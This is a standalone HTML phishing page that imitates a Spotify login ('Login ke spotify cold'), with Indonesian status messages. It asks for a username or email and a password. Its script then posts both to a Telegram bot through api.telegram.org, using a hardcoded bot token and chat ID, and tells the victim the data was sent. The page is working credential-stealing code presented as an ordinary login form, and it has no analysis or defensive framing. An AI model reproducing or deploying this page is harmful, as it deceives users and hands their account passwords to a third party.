<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>LOGIN FORM</title>
  <link rel="stylesheet" href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #081b29;
    }

    .wrapper {
      width: 420px;
      background: #0c2a43;
      color: #fff;
      border-radius: 10px;
      padding: 30px 40px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
    }

    .wrapper h1 {
      font-size: 36px;
      text-align: center;
    }

    .input-box {
      position: relative;
      width: 100%;
      height: 50px;
      margin: 30px 0;
    }

    .input-box input {
      width: 100%;
      height: 100%;
      background: transparent;
      border: none;
      outline: none;
      border: 2px solid #0ef;
      border-radius: 40px;
      font-size: 16px;
      color: #fff;
      padding: 20px 45px 20px 20px;
    }

    .input-box i {
      position: absolute;
      right: 20px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 20px;
    }

    .remember-forgot {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
      margin: 10px 0 15px;
    }

    .remember-forgot label input {
      accent-color: #0ef;
      margin-right: 5px;
    }

    .remember-forgot a {
      color: #0ef;
      text-decoration: none;
    }

    .remember-forgot a:hover {
      text-decoration: underline;
    }

    .btn {
      width: 100%;
      height: 45px;
      background: #0ef;
      border: none;
      outline: none;
      border-radius: 40px;
      box-shadow: 0 0 10px rgba(0, 238, 255, 0.5);
      cursor: pointer;
      font-size: 16px;
      color: #000;
      font-weight: 600;
    }

    .register-link {
      font-size: 14px;
      text-align: center;
      margin-top: 20px;
    }

    .register-link a {
      color: #0ef;
      text-decoration: none;
    }

    .register-link a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <form id="form">
      <h1>Login ke spotify cold</h1>
      <div class="input-box">
        <input type="text" placeholder="Username atau Email" id="email" required />
        <i class="bx bxs-user"></i>
      </div>
      <div class="input-box">
        <input type="password" placeholder="Password" id="password" required />
        <i class="bx bxs-lock-alt"></i>
      </div>
      <div class="remember-forgot">
        <label><input type="checkbox" /> Remember me</label>
        <a href="#">Forgot password?</a>
      </div>
      <button type="submit" class="btn">Login</button>
      <div class="register-link">
        <p>Don't have an account? <a href="#">Register</a></p>
      </div>
    </form>
  </div>

  <script>
    const form = document.getElementById('form');
    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const token = '7990813295:AAEJFfoqXph1CIeGUJoplPasA_UbWJqeOH4';
      const chat_id = '7816623164';
      const message = `Email/Username: ${email}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      })
      .then(response => {
        alert("Data berhasil dikirim. Silakan tunggu...");
        form.reset();
      })
      .catch(error => {
        alert("Terjadi kesalahan dalam pengiriman.");
        console.error(error);
      });
    });
  </script>
</body>
</html>
